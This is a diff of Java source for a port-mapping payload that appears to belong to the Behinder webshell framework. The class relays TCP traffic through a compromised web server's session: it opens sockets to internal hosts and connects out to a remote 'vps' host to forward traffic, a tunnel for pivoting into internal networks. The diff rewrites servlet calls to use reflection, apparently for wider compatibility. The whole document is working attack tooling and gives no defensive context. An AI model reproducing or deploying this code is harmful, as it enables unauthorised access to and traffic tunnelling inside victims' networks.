@@ -2,16 +2,12 @@ package net.rebeyond.behinder.payload.java;
 
 import java.io.IOException;
 import java.io.OutputStream;
+import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
 import java.nio.channels.SocketChannel;
 import java.util.Enumeration;
 import java.util.Map;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class PortMap implements Runnable {
    public static String action;
@@ -21,13 +17,13 @@ public class PortMap implements Runnable {
    public static String remoteIP;
    public static String remotePort;
    public static String extraData;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
    String localKey;
    String remoteKey;
    String type;
-   HttpSession httpSession;
+   Object httpSession;
 
    public boolean equals(Object obj) {
       try {
@@ -41,35 +37,36 @@ public class PortMap implements Runnable {
 
    public void portMap() throws Exception {
       String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
-      SocketChannel socketChannel = null;
       if (action.equals("createLocal")) {
          try {
             String target = targetIP;
             int port = Integer.parseInt(targetPort);
-            socketChannel = SocketChannel.open();
+            SocketChannel socketChannel = SocketChannel.open();
             socketChannel.connect(new InetSocketAddress(target, port));
             socketChannel.configureBlocking(false);
-            this.Session.setAttribute(localSessionKey, socketChannel);
-            ((HttpServletResponse)this.Response).setStatus(200);
-         } catch (Exception var9) {
-            Exception e = var9;
-            ServletOutputStream so = null;
+            this.sessionSetAttribute(this.Session, localSessionKey, socketChannel);
+            this.Response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
+         } catch (Exception var10) {
+            Exception e = var10;
 
             try {
-               so = ((HttpServletResponse)this.Response).getOutputStream();
-               so.write(new byte[]{55, 33, 73, 54});
-               so.write(e.getMessage().getBytes());
-               so.flush();
-               so.close();
-            } catch (IOException var8) {
-               var8.printStackTrace();
+               Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+               Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+               write.invoke(so, new byte[]{55, 33, 73, 54});
+               write.invoke(so, e.getMessage().getBytes());
+               so.getClass().getDeclaredMethod("flush").invoke(so);
+               so.getClass().getDeclaredMethod("close").invoke(so);
+            } catch (Exception var9) {
+               var9.printStackTrace();
             }
          }
       } else {
+         Method write;
+         SocketChannel socketChannel;
          Exception e;
-         ServletOutputStream so;
+         Object so;
          if (action.equals("read")) {
-            socketChannel = (SocketChannel)this.Session.getAttribute(localSessionKey);
+            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
             if (socketChannel == null) {
                return;
             }
@@ -78,33 +75,34 @@ public class PortMap implements Runnable {
                ByteBuffer buf = ByteBuffer.allocate(512);
                socketChannel.configureBlocking(false);
                int bytesRead = socketChannel.read(buf);
+               so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
 
-               for(so = this.Response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
-                  so.write(buf.array(), 0, bytesRead);
-                  so.flush();
+               for(write = so.getClass().getDeclaredMethod("write", byte[].class, Integer.TYPE, Integer.TYPE); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
+                  write.invoke(so, buf.array(), 0, bytesRead);
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
                   buf.clear();
                }
 
-               so.flush();
-               so.close();
-            } catch (Exception var11) {
-               e = var11;
-               ((HttpServletResponse)this.Response).setStatus(200);
-               socketChannel = null;
+               so.getClass().getDeclaredMethod("flush").invoke(so);
+               so.getClass().getDeclaredMethod("close").invoke(so);
+            } catch (Exception var12) {
+               e = var12;
+               this.Response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
 
                try {
-                  so = this.Response.getOutputStream();
-                  so.write(new byte[]{55, 33, 73, 54});
-                  so.write(e.getMessage().getBytes());
-                  so.flush();
-                  so.close();
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, new byte[]{55, 33, 73, 54});
+                  write.invoke(so, e.getMessage().getBytes());
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
                   socketChannel.socket().close();
-               } catch (IOException var7) {
-                  var7.printStackTrace();
+               } catch (IOException var8) {
+                  var8.printStackTrace();
                }
             }
          } else if (action.equals("write")) {
-            socketChannel = (SocketChannel)this.Session.getAttribute(localSessionKey);
+            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
 
             try {
                byte[] extraDataByte = this.base64decode(extraData);
@@ -116,44 +114,44 @@ public class PortMap implements Runnable {
                while(buf.hasRemaining()) {
                   socketChannel.write(buf);
                }
-            } catch (Exception var10) {
-               e = var10;
-               socketChannel = null;
+            } catch (Exception var11) {
+               e = var11;
 
                try {
-                  so = this.Response.getOutputStream();
-                  so.write(new byte[]{55, 33, 73, 54});
-                  so.write(e.getMessage().getBytes());
-                  so.flush();
-                  so.close();
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, new byte[]{55, 33, 73, 54});
+                  write.invoke(so, e.getMessage().getBytes());
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
                   socketChannel.socket().close();
-               } catch (IOException var6) {
-                  var6.printStackTrace();
+               } catch (IOException var7) {
+                  var7.printStackTrace();
                }
             }
          } else {
             Enumeration attributeNames;
             String attrName;
             if (action.equals("closeLocal")) {
-               attributeNames = this.Session.getAttributeNames();
+               attributeNames = this.sessionGetAttributeNames(this.Session);
 
                while(attributeNames.hasMoreElements()) {
                   attrName = attributeNames.nextElement().toString();
                   if (attrName.startsWith("local_")) {
-                     this.Session.removeAttribute(attrName);
+                     this.sessionRemoveAttribute(this.Session, attrName);
                   }
                }
             } else if (action.equals("createRemote")) {
                (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
-               ((HttpServletResponse)this.Response).setStatus(200);
+               this.Response.getClass().getDeclaredMethod("setStatus", Integer.TYPE).invoke(this.Response, 200);
             } else if (action.equals("closeRemote")) {
-               this.Session.setAttribute("remoteRunning", false);
-               attributeNames = this.Session.getAttributeNames();
+               this.sessionSetAttribute(this.Session, "remoteRunning", false);
+               attributeNames = this.sessionGetAttributeNames(this.Session);
 
                while(attributeNames.hasMoreElements()) {
                   attrName = attributeNames.nextElement().toString();
                   if (attrName.startsWith("remote")) {
-                     this.Session.removeAttribute(attrName);
+                     this.sessionRemoveAttribute(this.Session, attrName);
                   }
                }
             }
@@ -162,7 +160,7 @@ public class PortMap implements Runnable {
 
    }
 
-   public PortMap(String localKey, String remoteKey, String type, HttpSession session) {
+   public PortMap(String localKey, String remoteKey, String type, Object session) {
       this.localKey = localKey;
       this.remoteKey = remoteKey;
       this.httpSession = session;
@@ -173,11 +171,11 @@ public class PortMap implements Runnable {
    }
 
    public void run() {
-      int bytesRead=0;
+      int bytesRead = 0;
       if (this.type.equals("create")) {
-         this.httpSession.setAttribute("remoteRunning", true);
+         this.sessionSetAttribute(this.httpSession, "remoteRunning", true);
 
-         while((Boolean)this.httpSession.getAttribute("remoteRunning")) {
+         while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
             try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
@@ -186,7 +184,7 @@ public class PortMap implements Runnable {
                SocketChannel remoteSocketChannel = SocketChannel.open();
                remoteSocketChannel.connect(new InetSocketAddress(vps, bytesRead));
                String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
-               this.httpSession.setAttribute(remoteKey, remoteSocketChannel);
+               this.sessionSetAttribute(this.httpSession, remoteKey, remoteSocketChannel);
                ByteBuffer buf = ByteBuffer.allocate(512);
                if ((bytesRead = remoteSocketChannel.read(buf)) > 0) {
                   remoteSocketChannel.configureBlocking(true);
@@ -194,7 +192,7 @@ public class PortMap implements Runnable {
                   localSocketChannel.connect(new InetSocketAddress(target, port));
                   localSocketChannel.configureBlocking(true);
                   String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
-                  this.httpSession.setAttribute(localKey, localSocketChannel);
+                  this.sessionSetAttribute(this.httpSession, localKey, localSocketChannel);
                   localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
                   (new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession))).start();
                   (new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession))).start();
@@ -210,10 +208,10 @@ public class PortMap implements Runnable {
          OutputStream so;
          if (!this.type.equals("read")) {
             if (this.type.equals("write")) {
-               while((Boolean)this.httpSession.getAttribute("remoteRunning")) {
+               while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
                   try {
-                     localSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.localKey);
-                     remoteSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.remoteKey);
+                     localSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.localKey);
+                     remoteSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.remoteKey);
                      buf = ByteBuffer.allocate(512);
                      bytesRead = remoteSocketChannel.read(buf);
 
@@ -234,10 +232,10 @@ public class PortMap implements Runnable {
                }
             }
          } else {
-            while((Boolean)this.httpSession.getAttribute("remoteRunning")) {
+            while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
                try {
-                  localSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.localKey);
-                  remoteSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.remoteKey);
+                  localSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.localKey);
+                  remoteSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.remoteKey);
                   buf = ByteBuffer.allocate(512);
                   bytesRead = localSocketChannel.read(buf);
 
@@ -287,16 +285,62 @@ public class PortMap implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   private Enumeration sessionGetAttributeNames(Object session) {
+      Enumeration result = null;
+
+      try {
+         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+      } catch (Exception var4) {
+      }
+
+      return result;
+   }
+
+   private void sessionRemoveAttribute(Object session, String key) {
+      try {
+         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+      } catch (Exception var4) {
+      }
+
+   }
+
+   private void doOutPut(Object response, byte[] data) throws Exception {
+      Object so = response.getClass().getDeclaredMethod("getOutputStream").invoke(response);
+      Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+      write.invoke(so, data);
+      so.getClass().getDeclaredMethod("flush").invoke(so);
+      so.getClass().getDeclaredMethod("close").invoke(so);
    }
 }
